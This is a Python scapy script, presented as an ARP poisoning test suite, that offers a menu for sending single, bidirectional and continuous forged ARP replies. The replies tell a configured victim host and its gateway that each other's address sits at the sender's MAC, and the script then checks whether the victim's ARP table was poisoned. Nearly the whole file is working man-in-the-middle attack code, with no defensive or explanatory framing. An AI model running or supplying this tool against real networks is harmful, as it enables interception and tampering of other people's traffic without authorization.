#!/usr/bin/env python3
"""
Simple ARP Poisoning Test
Tests if ARP poisoning packets are being sent and received correctly
"""

import time
from scapy.all import *
from config import NetworkConfig, AttackConfig

def get_my_mac():
    """Get our MAC address"""
    return get_if_hwaddr(NetworkConfig.INTERFACE)

def test_single_arp_poison():
    """Send a single ARP poison packet and check if it works"""
    interface = NetworkConfig.INTERFACE
    victim_ip = AttackConfig.VICTIM_IP
    victim_mac = AttackConfig.VICTIM_MAC
    gateway_ip = AttackConfig.GATEWAY_IP
    my_mac = get_my_mac()
    
    print(f"🧪 TESTING SINGLE ARP POISON")
    print(f"Interface: {interface}")
    print(f"My MAC: {my_mac}")
    print(f"Target: Tell {victim_ip} ({victim_mac}) that {gateway_ip} is at {my_mac}")
    
    # Create ARP reply packet
    arp_packet = Ether(dst=victim_mac) / ARP(
        op=2,  # ARP reply
        pdst=victim_ip,
        hwdst=victim_mac,
        psrc=gateway_ip,
        hwsrc=my_mac
    )
    
    print(f"\n📤 Sending ARP poison packet...")
    try:
        sendp(arp_packet, iface=interface, verbose=1)
        print(f"✅ Packet sent successfully")
    except Exception as e:
        print(f"❌ Failed to send packet: {e}")
        return False
    
    print(f"\n⏱️ Waiting 2 seconds for effect...")
    time.sleep(2)
    
    # Check if poisoning worked
    print(f"🔍 Checking ARP table...")
    try:
        result = subprocess.run(['arp', '-n', victim_ip], capture_output=True, text=True)
        if result.returncode == 0:
            print(f"ARP result: {result.stdout.strip()}")
            if my_mac.lower() in result.stdout.lower():
                print(f"🎯 SUCCESS: Victim's ARP table shows our MAC for gateway!")
                return True
            else:
                print(f"❌ FAILED: Victim's ARP table not poisoned")
        else:
            print(f"❌ Could not check victim's ARP table")
    except Exception as e:
        print(f"❌ Error checking ARP: {e}")
    
    return False

def test_bidirectional_poison():
    """Test bidirectional ARP poisoning"""
    interface = NetworkConfig.INTERFACE
    victim_ip = AttackConfig.VICTIM_IP
    victim_mac = AttackConfig.VICTIM_MAC
    gateway_ip = AttackConfig.GATEWAY_IP
    gateway_mac = AttackConfig.GATEWAY_MAC
    my_mac = get_my_mac()
    
    print(f"\n🔄 TESTING BIDIRECTIONAL ARP POISON")
    
    # Poison victim (tell victim that gateway is at our MAC)
    packet1 = Ether(dst=victim_mac) / ARP(
        op=2,
        pdst=victim_ip,
        hwdst=victim_mac,
        psrc=gateway_ip,
        hwsrc=my_mac
    )
    
    # Poison gateway (tell gateway that victim is at our MAC)
    packet2 = Ether(dst=gateway_mac) / ARP(
        op=2,
        pdst=gateway_ip,
        hwdst=gateway_mac,
        psrc=victim_ip,
        hwsrc=my_mac
    )
    
    print(f"📤 Sending poison to victim: {victim_ip} -> gateway is at {my_mac}")
    try:
        sendp(packet1, iface=interface, verbose=0)
        print(f"✅ Victim poison sent")
    except Exception as e:
        print(f"❌ Failed to poison victim: {e}")
    
    print(f"📤 Sending poison to gateway: {gateway_ip} -> victim is at {my_mac}")
    try:
        sendp(packet2, iface=interface, verbose=0)
        print(f"✅ Gateway poison sent")
    except Exception as e:
        print(f"❌ Failed to poison gateway: {e}")
    
    return True

def test_continuous_poison(duration=30):
    """Test continuous ARP poisoning for a specified duration"""
    interface = NetworkConfig.INTERFACE
    victim_ip = AttackConfig.VICTIM_IP
    victim_mac = AttackConfig.VICTIM_MAC
    gateway_ip = AttackConfig.GATEWAY_IP
    gateway_mac = AttackConfig.GATEWAY_MAC
    my_mac = get_my_mac()
    
    print(f"\n⏰ TESTING CONTINUOUS POISON for {duration} seconds")
    print(f"Press Ctrl+C to stop early...")
    
    try:
        start_time = time.time()
        count = 0
        
        while time.time() - start_time < duration:
            # Poison victim
            packet1 = Ether(dst=victim_mac) / ARP(
                op=2, pdst=victim_ip, hwdst=victim_mac,
                psrc=gateway_ip, hwsrc=my_mac
            )
            
            # Poison gateway  
            packet2 = Ether(dst=gateway_mac) / ARP(
                op=2, pdst=gateway_ip, hwdst=gateway_mac,
                psrc=victim_ip, hwsrc=my_mac
            )
            
            sendp(packet1, iface=interface, verbose=0)
            sendp(packet2, iface=interface, verbose=0)
            
            count += 2
            if count % 10 == 0:
                print(f"📊 Sent {count} poison packets...")
            
            time.sleep(2)
            
    except KeyboardInterrupt:
        print(f"\n🛑 Stopped by user")
    
    print(f"✅ Continuous poison test completed. Sent {count} packets total.")

def monitor_arp_during_poison():
    """Monitor ARP table changes during poisoning"""
    print(f"\n👁️ MONITORING ARP CHANGES")
    print(f"Run this in another terminal while attacking:")
    print(f"   watch -n 1 'arp -a | grep -E \"(192.168.0.201|192.168.0.1)\"'")

def main():
    print("=" * 60)
    print("🧪 ARP POISONING TEST SUITE")
    print("=" * 60)
    
    # Show configuration
    print(f"Configuration:")
    print(f"  Victim: {AttackConfig.VICTIM_IP} ({AttackConfig.VICTIM_MAC})")
    print(f"  Gateway: {AttackConfig.GATEWAY_IP} ({AttackConfig.GATEWAY_MAC})")
    print(f"  Interface: {NetworkConfig.INTERFACE}")
    print(f"  My MAC: {get_my_mac()}")
    
    # Menu
    while True:
        print(f"\n" + "="*60)
        print(f"Choose test:")
        print(f"  1. Single ARP poison test")
        print(f"  2. Bidirectional poison test") 
        print(f"  3. Continuous poison (30 seconds)")
        print(f"  4. Show monitoring command")
        print(f"  5. Exit")
        
        choice = input(f"\nEnter choice (1-5): ").strip()
        
        if choice == "1":
            test_single_arp_poison()
        elif choice == "2":
            test_bidirectional_poison()
        elif choice == "3":
            test_continuous_poison()
        elif choice == "4":
            monitor_arp_during_poison()
        elif choice == "5":
            print("👋 Goodbye!")
            break
        else:
            print("❌ Invalid choice")

if __name__ == "__main__":
    main() 